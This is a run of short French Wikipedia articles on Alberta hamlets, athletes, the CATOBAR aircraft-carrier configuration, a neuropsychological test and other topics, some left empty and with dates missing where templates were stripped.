Un skibus relie - gratuitement pour les détenteurs d'un forfait de ski valide - les différentes stations de ski du Val d'Anniviers : Chandolin, Saint-Luc, Grimentz, Vercorin et Zinal via Vissoie.

</doc>
<doc id="7902993" url="https://fr.wikipedia.org/wiki?curid=7902993" title="Aaron Barrett">
Aaron Barrett

Aaron Barrett (né le à Evansville, Indiana, États-Unis) est un ancien lanceur de relève droitier des Ligues majeures de baseball qui a joué entre 2014 et 2015 puis 2019 et 2020 avec les Nationals de Washington.
Carrière.
Après avoir repoussé des offres des Dodgers de Los Angeles, qui le repêchent initialement en 2006 au de sélection, et des Rangers du Texas, qui le réclament au du repêchage amateur de 2009, Aaron Barrett, un joueur des Rebels de l'Université du Mississippi, est mis sous contrat par les Nationals de Washington, qui en font en 2010 leur choix de .
Le lanceur de relève fait ses débuts dans le baseball majeur pour Washington le . Il est le lanceur gagnant de cette partie, le match d'ouverture de la saison des Nationals, remporté 9-7 en 10 manches de jeu sur les Mets de New York.

</doc>
<doc id="7902994" url="https://fr.wikipedia.org/wiki?curid=7902994" title="Dally Duncan">
Dally Duncan

Douglas Duncan, couramment appelé Dally Duncan, est un footballeur international puis entraîneur écossais, né le , à Aberdeen et décédé le . Évoluant au poste de ailier gauche, il est particulièrement connu pour ses saisons à Derby County.
Il compte 14 sélections pour 7 buts inscrits en équipe d'Écosse.
Biographie.
Carrière en club.
Natif d'Aberdeen, il est formé par un club local, Aberdeen Richmond, et devient professionnel en 1928 en s'engageant pour Hull City. Il rejoint Derby County en 1932 lors d'un transfert d'un montant de 2 000 £ et il reste sous contrat avec ce club pendant 14 ans, remportant la FA Cup en 1946.
Pendant la période de la Seconde Guerre mondiale, il accomplit des piges avec Reading, Notts County et Nottingham Forest. 
En octobre 1946, il quitte Derby County pour devenir joueur-entraîneur à Luton Town avant de devenir uniquement entraîneur de ce club dès la saison suivante, en juin 1947, poste qu'il occupe jusqu'en octobre 1958. Il s'engage alors comme entraîneur des Blackburn Rovers et y reste deux ans.
Il quitte ensuite le monde du football pour s'occuper d'une chambre d'hôtes à Brighton. 
Carrière internationale.
Allan Brown reçoit 14 sélections en faveur de l'équipe d'Écosse. Il joue son premier match le , pour une défaite 2-5, au Tynecastle Stadium d'Édimbourg, contre le pays de Galles en British Home Championship. Il reçoit sa dernière sélection le , pour une défaite 1-2, au Ninian Park de Cardiff, toujours contre le pays de Galles en British Home Championship. Il inscrit 7 buts lors de ses 14 sélections, dont l'un lors de son premier match et un doublé.
Il participe avec l'Écosse aux British Home Championships de 1933 à 1938.

</doc>
<doc id="7902998" url="https://fr.wikipedia.org/wiki?curid=7902998" title="Affaire des micros">
Affaire des micros



</doc>
<doc id="7903001" url="https://fr.wikipedia.org/wiki?curid=7903001" title="Île Levanevski">
Île Levanevski

L'île Levanevski (en , "Ostrov Levanevskogo") est une petite île de la terre François-Joseph.
Géographie.
De forme allongée, à 1,8 kilomètre au sud de l'île Harley et à l'ouest de l'île Jackson, elle s'étend sur 1,7 km de longueur et 500 m de largeur. Libre de glace, son point culminant, situé dans le sud de l'île mesure 27 mètres.
Histoire.
Découverte par l'expédition de Frederick G. Jackson en 1895, elle est d'abord appelée île Neale en l’honneur de l'explorateur et médecin William Neale, nom qu'elle porte encore sur de nombreuses cartes. 
Elle a ensuite été renommée en l'honneur de l'aviateur arctique Sigismund Levanevski. 

</doc>
<doc id="7903008" url="https://fr.wikipedia.org/wiki?curid=7903008" title="Batterie rapide d'efficience frontale">
Batterie rapide d'efficience frontale

La batterie rapide d’efficience frontale (BREF) ou "Frontal Assessment Battery" (FAB) en anglais est un test neuropsychologique élaboré par Dubois et Pillon en 2000. Cette batterie ayant pour objectif de pouvoir être effectuée au chevet du patient, a pour vocation d'établir et mesurer un syndrome frontal. 
Constitution.
La passation du BREF dure environ dix minutes. 
L’échantillonnage a été effectué sur 42 sujets dits normaux et 121 patients avec des degrés divers de dysfonctionnement des lobes frontaux. 
Cette batterie, destinée à permettre une évaluation rapide des fonctions exécutives au lit du patient, est composée de six sous tests :
Épreuve des similitudes.
Elle explore l’élaboration conceptuelle.
Épreuve d’évocation lexicale.
Elle explore la flexibilité mentale, c’est-à-dire la capacité d’adapter ses choix aux contingences.
Il s'agit pour ce sous test de dire le maximum de mots commençant par la lettre S en une minute. 
Séquence gestuelle de Luria.
Elle permet d’explorer la programmation des actes moteurs.
Le patient doit alors répéter une séquence de gestes « paume - tranche- poing » effectuée trois fois par l'examinateur avec sa main droite sur sa main gauche. 
Dans un premier temps cette gestuelle est effectuée en simultané avec l'examinateur puis le patient doit refaire cette séquence gestuelle seul.
Épreuve des consignes conflictuelles.
Elle explore la sensibilité aux interférences.
On dit au patient « Tape deux fois quand je tape une fois ». Après s'être assuré de la compréhension de la consigne l'examinateur effectue la série suivante : 1-1-2-1-2-2-2-1-1-2.
Épreuve Go–No Go.
Elle explore le contrôle inhibiteur.
On dit au patient « Tape une fois quand je tape une fois ». Après s'être assuré de la compréhension de la consigne l'examinateur effectue la série suivante : 1-1-2-1-2-2-2-1-1-2.
Recherche d’un comportement de préhension.
Elle explore l’autonomie environnementale.
L'examinateur s'assoit en face du patient et place les mains du patient sur ses genoux paume face au ciel, puis l’examinateur approche ses mains de celles du patient sans rien dire et touche la paume des deux mains du patient.
Aspect neurologique.
La BREF est facile à administrer cliniquement et est sensible au dysfonctionnement des lobes frontaux.
La batterie est constituée de six sous-tests évaluant les fonctions cognitives suivantes :
Chacun de ces processus est nécessaire pour élaborer des comportements tournés vers un but et pour adapter ses réponses et ses réactions à des nouvelles situations. Or ces fonctions sont gérées par le cortex préfrontal.
D’autre part, les sous-tests ont été choisis pour leurs corrélations significatives avec le métabolisme frontal, comme l’ont démontré des mesures relatives aux répartitions régionales à l’aide une Tomographie par Émission de Positons (TEP) avec du 18-fluorodeoxyglucose effectuées chez des patients atteints de lésions cérébrales dans les lobes frontaux dont les étiologies sont variées

</doc>
<doc id="7903015" url="https://fr.wikipedia.org/wiki?curid=7903015" title="Michel Monet au pompon">
Michel Monet au pompon

Michel Monet au pompon est un tableau de Claude Monet daté de 1880. Il représente le fils de l'artiste, Michel Monet.
Description.
Le tableau est un portrait de Claude Monet, alors enfant, portant un bonnet à pompon.
Histoire.
Le tableau a été réalisé en 1880.
Il est conservé au musée Marmottan Monet.

</doc>
<doc id="7903016" url="https://fr.wikipedia.org/wiki?curid=7903016" title="Les Sœurs Boulay">
Les Sœurs Boulay

Les sœurs Boulay sont un duo québécois d'auteures-compositrices-interprètes originaire de New Richmond. Composé de Stéphanie et Mélanie Boulay, le duo s'est fait connaître en remportant le concours Francouvertes en 2012.
Biographie.
En 2012, Stéphanie et Mélanie Boulay remportent le concours Francouvertes du Club Soda et quelques mois plus tard, elles enregistrent leur premier album "Le poids des confettis", sous l'étiquette Grosse Boîte, et produit par Philippe B au studio Wild de Saint-Zénon. Plus de 80 000 exemplaires de l'album seront vendus, donnant lieu à une tournée de plus de 250 spectacles à travers le Québec.
Elles connaissent un grand succès: Mélanie et Stéphanie Boulay remportent le "Félix" de la révélation de l’année à l"'ADISQ" 2013 ainsi que le prix du meilleur album folk. Les deux sœurs triomphent également au "Gala alternatif de la musique indépendante du Québec." Les filles ont remporté le prix pour l’album folk de l’année et ont été élues artistes de l’année.
Le , lors de la finale de l'émission La Voix, les sœurs Boulay sont invitées où elles chantent en compagnie d'Isabelle Boulay leur succès "Mappemonde". À la suite de la diffusion de l'émission vue par 2,7 millions de téléspectateurs, leur album s'est hissé au premier rang du palmarès canadien d'iTunes, toutes langues confondues.
En 2014, elles sont les porte-paroles des Francouvertes.
Le , elles offrent une performance avec invités aux FrancoFolies de Montréal sur la grande scène de la place des Festivals devant une foule estimée à personnes. Leur , "4488 de l'amour", sort le , réalisé également par Philippe B. En 2017, elles sortent un album EP contenant 4 chansons : "Lendemains."
En 2017, elles participent au projet "Une chanson à l'école," en invitant 500 écoles à chanter avec elles la chanson "De la terre jusqu'au courant."
Depuis l'été 2016, Mélanie Boulay est en couple avec l'humoriste québécois Guillaume Wagner.
Le , Stéphanie Boulay sort son premier livre jeunesse "Anatole qui ne séchait jamais" avec l'aide de l'illustratrice Agathe Bray-Bourret. L'œuvre remporta le Prix Choix du public, présenté dans le cadre du Prix TD de littérature jeunesse, en association avec Radio-Canada.
Leur dernier album, "Échapper à la nuit", est sorti en octobre 2022 et se démarque par sa grande douceur.

</doc>
<doc id="7903022" url="https://fr.wikipedia.org/wiki?curid=7903022" title="Martyr's Mirror">
Martyr's Mirror



</doc>
<doc id="7903026" url="https://fr.wikipedia.org/wiki?curid=7903026" title="CATOBAR">
CATOBAR

CATOBAR (acronyme de l'anglais (ou ) ) est une configuration de pont d'envol de porte-avions pour le catapultage et l'appontage horizontal d'aéronefs. Dans cette configuration, l'avion est assisté d'une catapulte qui le projette à grande vitesse pour le décollage et se sert de brins d'arrêt présents sur le pont pour l'appontage. Les porte-avions équipés de cette configuration disposent de pistes obliques pouvant assurer le décollage et l'appontage d'appareils simultanément sur le pont d'envol.
Description.
En configuration CATOBAR, le pont d’envol des porte-avions est aménagé avec des pistes obliques équipées de catapultes pour le décollage et de brins d’arrêts pour l’atterrissage. Les aéronefs évoluant sur ce type de porte-avions sont spécialement renforcés et équipés d'une crosse d'appontage. Ces avantages augmentent l’autonomie et les capacités opérationnelles du parc aérien et contribuent à rendre la configuration CATOBAR plus performante que les autres,(STOBAR et STOVL), sur les porte-avions .
Décollage avec catapultes.
Le décollage est effectué à l’aide d’une catapulte qui assiste la propulsion de l’avion lors de la phase d'accélération. L'utilisation de catapultes permet de mettre en œuvre des chasseurs embarquant plus de carburant et d'armement, ce qui augmente leur capacité opérationnelle . Les catapultes permettent aussi d'embarquer des appareils qui ne pourraient décoller par leurs propres moyens sur des pistes aussi courtes, comme des aéronefs turbopropulsés. Les contraintes dues aux conditions météorologiques et la force des vents sont moins importantes pour les décollages horizontaux réalisés avec catapultes.
Appontage avec brins d'arrêt.
L'appontage est obtenu en freinant l'avion grâce à sa crosse d'appontage qui accroche un des brins d'arrêts disposés sur le pont du navire, en cas d'échec ou d'avion endommagé, une barrière d'arrêt est déployée. Ce système de récupération des avions permet de diminuer la distance d'arrêt à seulement une dizaine de mètres.
Types.
Le système de catapulte utilisé sur les porte-avions CATOBAR actuellement en service est la catapulte à vapeur. Son avantage est qu'elle peut fournir une importante puissance. Durant la Seconde Guerre mondiale, la Marine américaine utilisait des catapultes hydrauliques.
La Marine américaine a développé un système de catapultage à l'aide d'un moteur électrique linéaire appelé EMALS, mis en œuvre sur le porte-avion nucléaire .
Utilisateurs.
Après que la marine brésilienne a annoncé le désarmement du porte-avion "NAe São Paulo" (ex-"Foch") en , seules deux nations étaient capables publiquement de catapulter des avions, jusqu'en 2025. Il s'agit des États-Unis avec les porte-avions de classe Nimitz et la France avec le "Charles de Gaulle". Les nouveaux porte-avions américains appartenant à la classe Gerald R. Ford, utilisent le système CATOBAR, mais avec une catapulte électromagnétique (EMALS) à la place d'une catapulte à vapeur .
Avec le lancement du porte-avion Fujian (18) chinois, équipé d’un système de catapultes CATOBAR électromagnétique (EMALS), une troisième nation utilise ce système.

</doc>
<doc id="7903028" url="https://fr.wikipedia.org/wiki?curid=7903028" title="Konstantin Schad">
Konstantin Schad

Konstantin Schad, né le à Rosenheim, est un snowboardeur allemand spécialiste de snowboardcross.
Carrière.
Il a pris part à deux éditions des Jeux olympiques en 2010 à Vancouver, ne dépassant pas le stade des qualifications puis en 2014 aux Jeux de Sotchi, arrivant jusqu'en quarts de finale. Il a remporté durant sa carrière, une manche de Coupe du monde le à Valmalenco.

</doc>
<doc id="7903029" url="https://fr.wikipedia.org/wiki?curid=7903029" title="Stefen Romero">
Stefen Romero

Stefen Daniel Romero (né le à Tucson, Arizona, États-Unis) est un voltigeur des Mariners de Seattle de la Ligue majeure de baseball.
Carrière.
Joueur des Beavers de l'Université d'État de l'Oregon, Stefen Romero est repêché en par les Mariners de Seattle en 2010. 
En 2012, il est nommé joueur de ligues mineures de l'année dans l'organisation des Mariners après une belle saison à l'attaque en Double-A chez les Generals de Jackson de la Ligue Southern. Cette année-là, le joueur de 23 ans, qui avait débuté l'année au niveau A+ chez les High Desert Mavericks de la Ligue de Californie, frappe pour ,352 de moyenne au bâton avec 106 points produits, 85 points marqués et 64 coups sûrs de plus d'un but.
Dans les ligues mineures, Romero est surtout joueur de deuxième but. Mais c'est comme joueur de champ extérieur qu'il fait ses débuts dans le baseball majeur avec les Mariners de Seattle. Il joue son premier match le . Il réussit son premier coup sûr au plus haut niveau le lendemain, 2 avril, aux dépens du lanceur Hector Santiago des Angels de Los Angeles.

</doc>
<doc id="7903056" url="https://fr.wikipedia.org/wiki?curid=7903056" title="Phyllis Haver">
Phyllis Haver

Phyllis O'Haver (connue comme Phyllis Haver) est une actrice américaine, née le à Douglass (Kansas), morte le à Sharon (Connecticut).
Biographie.
Phyllis Haver débute au cinéma dans un court métrage sorti en 1916. Suivent de nombreux autres courts métrages produits par Mack Sennett (dont "A Janitor's Vengeance" de Charles Avery en 1917, avec Harry Depp et Claire Anderson), où elle est l'une des « Bathing Beauties », aux côtés notamment de Louise Fazenda et Gloria Swanson.
Parmi ses cent-quatre films muets américains, mentionnons également "Calvaire d'apôtre" de Maurice Tourneur (1923, avec Richard Dix et Mae Busch), le western "Trois Sublimes Canailles" de John Ford (1926, avec George O'Brien et Olive Borden), ou encore "Quand la chair succombe" de Victor Fleming (1927, avec Emil Jannings et Belle Bennett).
Hormis quelques films partiellement sonorisés sortis en 1928 et 1929 (dont "Thunder" de William Nigh, son avant-dernier film, avec Lon Chaney), Phyllis Haver se retire à l'avènement du parlant, tenant seulement un petit rôle non crédité dans un ultime film sorti en 1930.
Elle se suicide en 1960, à 61 ans.

</doc>
<doc id="7903064" url="https://fr.wikipedia.org/wiki?curid=7903064" title="Instituto Nacional de Ciencias Médicas y Nutrición">
Instituto Nacional de Ciencias Médicas y Nutrición

LInstituto Nacional de Ciencias Médicas y Nutrición plus formellement appelé Instituto Nacional de Ciencias Médicas y Nutrición Salvador Zubirán, est une institution de l’assistance publique appartenant au secrétariat à la Santé du Mexique. Il fait partie de l'ensemble de douze hôpitaux hautement spécialisés qui assurent des services relatifs à la santé publique à population mexicaine. Le l'«Instituto Nacional de la Nutrición Salvador Zubirán» change de nom et adopte celui de Instituto Nacional de Ciencias Médicas y Nutrición Salvador Zubirán, nom qui reflète de façon plus adéquate les activités d'attention médicales, de recherche et d'enseignement qui ont lieu dans l'institut, dans le domaine de la médecine interne, la chirurgie et la nutrition.

</doc>
<doc id="7903080" url="https://fr.wikipedia.org/wiki?curid=7903080" title="Mario Hollands">
Mario Hollands

Mario Eduardo Lemus Hollands (né le à Oakland, Californie, États-Unis) est un lanceur gaucher de baseball qui joue dans les Ligues majeures avec les Phillies de Philadelphie en 2014.
Carrière.
Joueur des Gauchos de l'Université de Californie à Santa Barbara, Mario Hollands est sélectionné au du repêchage amateur par les Twins du Minnesota en 2009 mais il repousse l'offre. Il rejoint les Phillies de Philadelphie, qui le réclament au l'année suivante. 
Hollands est tantôt lanceur partant, tantôt lanceur de relève dans les ligues mineures. Après la saison 2013 jouée au niveau Double-A des ligues mineures chez les Fightin Phils de Reading, Hollands évolue pour les Tiburones de La Guaira de la Ligue d'hiver du Venezuela, où il maintient une moyenne de points mérités de 2,45.
C'est comme releveur qu'il fait à l'âge de 25 ans ses débuts dans le baseball majeur. Il encaisse la défaite à son premier match joué pour Philadelphie, le , alors qu'il est victime en fin de manche d'un coup sûr d'Adrián Beltré qui procure aux Rangers du Texas une victoire de 3-2.

</doc>
<doc id="7903082" url="https://fr.wikipedia.org/wiki?curid=7903082" title="Phillies de Reading">
Phillies de Reading



</doc>
<doc id="7903088" url="https://fr.wikipedia.org/wiki?curid=7903088" title="Bassanello">
Bassanello

Le bassanello est un instrument à vent et à anche double de la Renaissance, répandu en Italie jusqu'au . Il s'agit d'un instrument à l'apparence proche d'un basson, inventé selon Michael Praetorius par Giovanni Bassano, un important musicien et compositeur vénitien. Selon Praetorius toujours, le son du bassanello était proche de celui du basson tout en étant beaucoup moins fort.

</doc>
<doc id="7903105" url="https://fr.wikipedia.org/wiki?curid=7903105" title="Combat de Ghaziabad">
Combat de Ghaziabad

Le combat de Ghaziabad a lieu pendant la guerre d'Afghanistan.
Déroulement.
Une base de l'armée nationale afghane, située dans le district de Ghaziabad, dans la province de Kounar, est attaquée le par les talibans.
Le district de Ghaziaba est situé près de la frontière pakistanaise, le centre de ce district est contrôlé par les troupes gouvernementales, mais les forces talibanes sont présentes partout ailleurs. 
Forts de plus de 100 hommes selon le chef de la police locale, les assaillants détruisent le poste avancé. Plusieurs soldats sont tués et quelques-uns sont faits prisonniers. Lors du combat, les insurgés envoient un kamikaze se faire exploser près des soldats, cependant et malgré une longue fusillade, les renforts militaires ne subissent ni tués ni blessés.
Les forces gouvernementales afghanes envoient alors des renforts qui parviennent à accrocher les talibans en repli, ils seraient parvenus à délivrer quatre captifs.
L'attaque est revendiquée le jour même par les talibans dans un communiqué adressé aux médias.
Bilan et pertes.
Les forces militaires afghanes subissent lors de ce combat leurs plus lourdes pertes depuis des mois. Selon le bilan définitif donné par Zahi Azimi, porte-parole du ministère de la Défense, 21 soldats ont été tués, 3 sont blessés et 6 portés disparus.
Pour Shujah-Ul Mulk Jalala, gouverneur de la province, sept soldats ont été faits prisonniers lors du combat. Ce dernier estime également que les insurgés ont bénéficié de la complicité de certains soldats.
Des pourparlers sont un temps engagé afin d'effectuer un échange de prisonniers, mais les négociations sont suspendues par les Taliban.
À l'annonce de l'attaque, le président afghan Hamid Karzai annule un déplacement au Sri Lanka, présente ses condoléances aux familles, condamne l'attaque, mais il accuse aussi une nouvelle fois le Pakistan de passivité.

</doc>
<doc id="7903111" url="https://fr.wikipedia.org/wiki?curid=7903111" title="Beaver Crossing (Alberta)">
Beaver Crossing (Alberta)

 
Beaver Crossing est un hameau ("hamlet") de Bonnyville N 87, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903112" url="https://fr.wikipedia.org/wiki?curid=7903112" title="Beaverdam (Alberta)">
Beaverdam (Alberta)

 
Beaverdam est un hameau ("hamlet") de Bonnyville N 87, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903113" url="https://fr.wikipedia.org/wiki?curid=7903113" title="Cherry Grove (Alberta)">
Cherry Grove (Alberta)

 
Cherry Grove est un hameau ("hamlet") de Bonnyville N 87, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903114" url="https://fr.wikipedia.org/wiki?curid=7903114" title="La Corey">
La Corey

La Corey est un hameau ("hamlet") de Bonnyville N 87, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903115" url="https://fr.wikipedia.org/wiki?curid=7903115" title="Breynat (Alberta)">
Breynat (Alberta)

Breynat est un hameau ("hamlet") du Comté d'Athabasca, situé dans la province canadienne d'Alberta.
Toponymie.
Le terme « Breynat » constitue un patronyme de famille d'origine française.

</doc>
<doc id="7903116" url="https://fr.wikipedia.org/wiki?curid=7903116" title="Caslan">
Caslan

Caslan est un hameau ("hamlet") du Comté d'Athabasca, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903117" url="https://fr.wikipedia.org/wiki?curid=7903117" title="Wandering River">
Wandering River

Wandering River est un hameau ("hamlet") du Comté d'Athabasca, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903118" url="https://fr.wikipedia.org/wiki?curid=7903118" title="Campsie (Alberta)">
Campsie (Alberta)

 
Campsie est un hameau ("hamlet") du Comté de Barrhead N 11, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903119" url="https://fr.wikipedia.org/wiki?curid=7903119" title="Manola (Alberta)">
Manola (Alberta)

Manola est un hameau ("hamlet") du Comté de Barrhead N 11, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903120" url="https://fr.wikipedia.org/wiki?curid=7903120" title="Neerlandia">
Neerlandia

Neerlandia est un hameau ("hamlet") du Comté de Barrhead N 11, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903121" url="https://fr.wikipedia.org/wiki?curid=7903121" title="Thunder Lake (Alberta)">
Thunder Lake (Alberta)

Thunder Lake est un hameau ("hamlet") du Comté de Barrhead N 11, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903123" url="https://fr.wikipedia.org/wiki?curid=7903123" title="Peoria (Alberta)">
Peoria (Alberta)

 
Peoria est un hameau ("hamlet") du Comté de Birch Hills, situé dans la province canadienne d'Alberta.
Références.
 
Liens externes.
 

</doc>
<doc id="7903124" url="https://fr.wikipedia.org/wiki?curid=7903124" title="Tangent (Alberta)">
Tangent (Alberta)

 
Tangent est un hameau ("hamlet") du Comté de Birch Hills, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903125" url="https://fr.wikipedia.org/wiki?curid=7903125" title="Watino">
Watino

Watino est un hameau ("hamlet") du Comté de Birch Hills, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903127" url="https://fr.wikipedia.org/wiki?curid=7903127" title="Buck Creek">
Buck Creek

Buck Creek est un hameau ("hamlet") du Comté de Brazeau, situé dans la province canadienne d'Alberta.
La population est de 107 habitants (2005).

</doc>
<doc id="7903128" url="https://fr.wikipedia.org/wiki?curid=7903128" title="Cynthia (Alberta)">
Cynthia (Alberta)

Cynthia est un hameau ("hamlet") du comté de Brazeau, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903129" url="https://fr.wikipedia.org/wiki?curid=7903129" title="Rocky Rapids">
Rocky Rapids

Rocky Rapids est un hameau ("hamlet") du Comté de Brazeau, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903130" url="https://fr.wikipedia.org/wiki?curid=7903130" title="Violet Grove (Alberta)">
Violet Grove (Alberta)

Violet Grove est un hameau ("hamlet") du Comté de Brazeau, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903131" url="https://fr.wikipedia.org/wiki?curid=7903131" title="Aetna (Alberta)">
Aetna (Alberta)

Aetna est un hameau du sud de l'Alberta, au Canada, situé dans le comté de Cardston, à 2 kilomètres à l'est de l', à environ 70 kilomètres au sud-ouest de Lethbridge.
La colonisation de la région d'Aetna a commencé en 1888. Jusqu'en 1893, la région était connue sous le nom de Snake Creek. En 1893, la communauté a été nommée d'après le mont Etna par John W. Taylor, apôtre de l'Église de Jésus-Christ des Saints des Derniers Jours, qui a remarqué qu'une colline voisine ressemblait à la montagne sicilienne.
Données Démographiques.
Lors du Recensement de la population de 2021 mené par Statistique Canada, Aetna comptait une population de 109 habitants vivant dans 35 des 37 logements privés au total, ce qui représente une baisse de -3,5 % par rapport à sa population de 113 en 2016. Avec une superficie de 0,95 km2 (0,37 mi2), la densité de population était de 114,7 habitants par km2 (297,2 habitants par mi2) en 2021.
En tant que lieu désigné lors du Recensement de la population de 2016 mené par Statistique Canada, Aetna comptait une population de 113 habitants vivant dans 31 des 33 logements privés au total, ce qui représentait une augmentation de 50,7 % par rapport à sa population de 75 en 2011. Avec une superficie de 0,95 km2 (0,37 mi2), la densité de population était de 118,9 habitants par km2 (308,1 habitants par mi2) en 2016.

</doc>
<doc id="7903132" url="https://fr.wikipedia.org/wiki?curid=7903132" title="Beazer">
Beazer

Beazer est un hameau ("hamlet") du Comté de Cardston, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903133" url="https://fr.wikipedia.org/wiki?curid=7903133" title="Carway (Alberta)">
Carway (Alberta)

Carway est un hameau ("hamlet") du Comté de Cardston, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903134" url="https://fr.wikipedia.org/wiki?curid=7903134" title="Del Bonita (Alberta)">
Del Bonita (Alberta)

 
Del Bonita est un hameau ("hamlet") du Comté de Cardston, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903135" url="https://fr.wikipedia.org/wiki?curid=7903135" title="Kimball (Alberta)">
Kimball (Alberta)

Kimball est un hameau ("hamlet") du Comté de Cardston, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903136" url="https://fr.wikipedia.org/wiki?curid=7903136" title="Leavitt (Alberta)">
Leavitt (Alberta)

 
Leavitt est un hameau ("hamlet") du Comté de Cardston, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903137" url="https://fr.wikipedia.org/wiki?curid=7903137" title="Spring Coulee (Alberta)">
Spring Coulee (Alberta)

Spring Coulee est un hameau ("hamlet") du Comté de Cardston, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903138" url="https://fr.wikipedia.org/wiki?curid=7903138" title="Welling (Alberta)">
Welling (Alberta)

 
Welling est un hameau ("hamlet") du Comté de Cardston, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903139" url="https://fr.wikipedia.org/wiki?curid=7903139" title="Welling Station (Alberta)">
Welling Station (Alberta)

Welling Station est un hameau ("hamlet") du comté de Cardston, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903140" url="https://fr.wikipedia.org/wiki?curid=7903140" title="Woolford (Alberta)">
Woolford (Alberta)

Woolford est un hameau ("hamlet") du Comté de Cardston, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903141" url="https://fr.wikipedia.org/wiki?curid=7903141" title="Alhambra (Alberta)">
Alhambra (Alberta)

 
Alhambra est un hameau ("hamlet") du Comté de Clearwater, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903142" url="https://fr.wikipedia.org/wiki?curid=7903142" title="Condor (Alberta)">
Condor (Alberta)

 
Condor est un hameau ("hamlet") du Comté de Clearwater, situé dans la province canadienne d'Alberta.
Société.
Personnalités
Références.
 

</doc>
<doc id="7903143" url="https://fr.wikipedia.org/wiki?curid=7903143" title="Nordegg">
Nordegg

Nordegg est un hameau ("hamlet") du Comté de Clearwater, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903144" url="https://fr.wikipedia.org/wiki?curid=7903144" title="Withrow (Alberta)">
Withrow (Alberta)

Withrow est un hameau ("hamlet") du Comté de Clearwater, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903145" url="https://fr.wikipedia.org/wiki?curid=7903145" title="Etzikom">
Etzikom

Etzikom est un hameau ("hamlet") du Comté de Forty Mile N 8, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903146" url="https://fr.wikipedia.org/wiki?curid=7903146" title="Manyberries">
Manyberries

Manyberries est un hameau ("hamlet") du Comté de Forty Mile N 8, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903147" url="https://fr.wikipedia.org/wiki?curid=7903147" title="Orion (Alberta)">
Orion (Alberta)

 
Orion est un hameau ("hamlet") du Comté de Forty Mile N 8, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903148" url="https://fr.wikipedia.org/wiki?curid=7903148" title="Skiff (Alberta)">
Skiff (Alberta)

Skiff est un hameau ("hamlet") du Comté de Forty Mile N 8, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903149" url="https://fr.wikipedia.org/wiki?curid=7903149" title="Demmitt">
Demmitt

Demmitt est un hameau ("hamlet") du Comté de Grande Prairie N 1, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903150" url="https://fr.wikipedia.org/wiki?curid=7903150" title="Dimsdale (Alberta)">
Dimsdale (Alberta)

 
Dimsdale est un hameau ("hamlet") du Comté de Grande Prairie N 1, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903151" url="https://fr.wikipedia.org/wiki?curid=7903151" title="Elmworth">
Elmworth

Elmworth est un hameau ("hamlet") du Comté de Grande Prairie N 1, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903152" url="https://fr.wikipedia.org/wiki?curid=7903152" title="Goodfare">
Goodfare

Goodfare est un hameau ("hamlet") du Comté de Grande Prairie N 1, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903153" url="https://fr.wikipedia.org/wiki?curid=7903153" title="Huallen">
Huallen

Huallen est un hameau ("hamlet") du Comté de Grande Prairie N 1, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903154" url="https://fr.wikipedia.org/wiki?curid=7903154" title="Teepee Creek">
Teepee Creek

Teepee Creek est un hameau ("hamlet") du Comté de Grande Prairie N 1, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903155" url="https://fr.wikipedia.org/wiki?curid=7903155" title="Wedgewood (Alberta)">
Wedgewood (Alberta)

Wedgewood est un hameau ("hamlet") du Comté de Grande Prairie N 1, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903156" url="https://fr.wikipedia.org/wiki?curid=7903156" title="Hylo">
Hylo

Hylo est un hameau ("hamlet") du Comté de Lac La Biche, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903157" url="https://fr.wikipedia.org/wiki?curid=7903157" title="Venice (Alberta)">
Venice (Alberta)

 
Venice est un hameau ("hamlet") du Comté de Lac La Biche, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903158" url="https://fr.wikipedia.org/wiki?curid=7903158" title="Cherhill (Alberta)">
Cherhill (Alberta)

 
Cherhill est un hameau ("hamlet") du Comté de Lac Sainte-Anne, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903159" url="https://fr.wikipedia.org/wiki?curid=7903159" title="Glenevis">
Glenevis

Glenevis est un hameau ("hamlet") du Comté de Lac Sainte-Anne, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903160" url="https://fr.wikipedia.org/wiki?curid=7903160" title="Green Court">
Green Court

